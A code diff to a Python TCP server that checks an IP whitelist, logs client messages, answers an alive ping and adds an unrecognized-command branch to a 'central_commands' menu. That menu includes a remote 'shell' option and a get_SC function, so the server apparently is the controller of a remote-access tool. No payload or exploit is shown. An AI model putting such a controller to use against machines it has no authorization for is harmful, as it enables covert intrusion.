@@ -26,13 +26,19 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
         if (self.client_address[0] not in WHITE_LIST) :
             print('IP not in the WhiteList')
             return
+        
+        packet_header_size = 4 # Header will always be 4 bytes long
+        packer_header = 0 # text is send over 1024 bytes and images over 8192
+
         try :
             while True : # Keep the connection Open
                 self.data = self.request.recv(1024).strip() # buff size 1024
-                print(f'{self.client_address} > ' + self.data.decode('utf-8'))
+                message = self.data.decode('utf-8')
+                print(f'{self.client_address} > ' + message)
 
-                # send back data
-                self.request.sendall(b'Alive ping back received')
+                # send alive ping back
+                if (message == 'First connection ping'):
+                    self.request.sendall(b'Alive ping back received')
                 
         except ConnectionAbortedError :
             print('Connection was aborted by the local system')
@@ -82,6 +88,8 @@ def central_commands():
                 get_SC(msg)
             elif menu_option == 'shell':
                 send_shell(msg)
+            else :
+                print('Command not recognized')
 
     except KeyboardInterrupt:
         print('Central commands terminated')
